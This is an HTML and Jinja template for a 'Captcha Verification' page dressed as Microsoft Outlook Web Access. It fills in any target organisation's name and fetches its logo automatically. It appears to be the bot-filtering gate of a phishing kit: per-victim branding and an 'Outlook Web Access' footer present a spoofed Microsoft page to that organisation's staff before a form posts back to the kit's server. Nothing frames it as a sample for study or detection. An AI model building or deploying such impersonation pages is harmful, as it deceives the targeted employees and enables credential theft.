<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Captcha Verification - {{ins}}</title>
  <link rel="icon" href="https://api.kickfire.com/logo?website={{ins}}" type="image/x-icon">

  <!-- Microsoft Font -->
  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600&display=swap" rel="stylesheet">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: "Segoe UI", sans-serif;
    }

    html, body {
      height: 100%;
      background: #f3f2f1; /* OWA light grey */
      color: #1b1b1b;
    }

    .container {
      width: 100%;
      max-width: 380px;
      margin: 10vh auto;
      background: #ffffff;
      border: 1px solid #e1dfdd;
      border-radius: 6px;
      padding: 32px 36px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
    }

    .logo {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo img {
      width: 60px;
      height: 60px;
      border-radius: 8px;
      object-fit: cover;
    }

    .logo h1 {
      font-size: 20px;
      font-weight: 600;
      color: #323130;
      margin-top: 10px;
    }

    label {
      font-size: 14px;
      color: #605e5c;
      font-weight: 600;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 15px;
      margin-top: 15px;
    }

    .captcha-img {
      width: 100%;
      border-radius: 4px;
      border: 1px solid #c8c6c4;
      padding: 6px;
      background: #faf9f8;
    }

    input[type="text"] {
      height: 40px;
      padding: 0 10px;
      border: 1px solid #c8c6c4;
      border-radius: 4px;
      font-size: 15px;
      background-color: #fff;
    }

    input[type="text"]:focus {
      border-color: #0078d4;
      outline: 2px solid #cce4f7;
    }

    button {
      background: linear-gradient(135deg, #0078D4, #005A9E);
      border: none;
      color: #ffffff;
      height: 42px;
      font-size: 15px;
      font-weight: 600;
      border-radius: 4px;
      cursor: pointer;
      transition: 0.2s;
    }

    button:hover {
      background: #005A9E;
    }

    .error {
      color: #d13438;
      font-size: 13px;
      text-align: center;
      margin-top: -5px;
    }

    .note {
      margin-top: 20px;
      font-size: 11px;
      color: #605e5c;
      text-align: center;
    }
  </style>
</head>

<body>

  <div class="container">
    <div class="logo">
      <img src="https://api.kickfire.com/logo?website={{ins}}" alt="{{ins}} Logo">
      <h1>Captcha Verification</h1>
    </div>

    <form method="POST" action="/">
      <img class="captcha-img" src="data:image/png;base64,{{ captcha_image }}" alt="Captcha Code">

      <label for="code">Enter the characters you see</label>
      <input type="text" id="code" name="code" placeholder="Enter code" required autocomplete="off">

      <button type="submit">Verify</button>

      {% if error %}
      <div class="error">{{ message }}</div>
      {% endif %}
    </form>

    <div class="note">
      © {{ins}} • Outlook Web Access
    </div>
  </div>

</body>

</html>
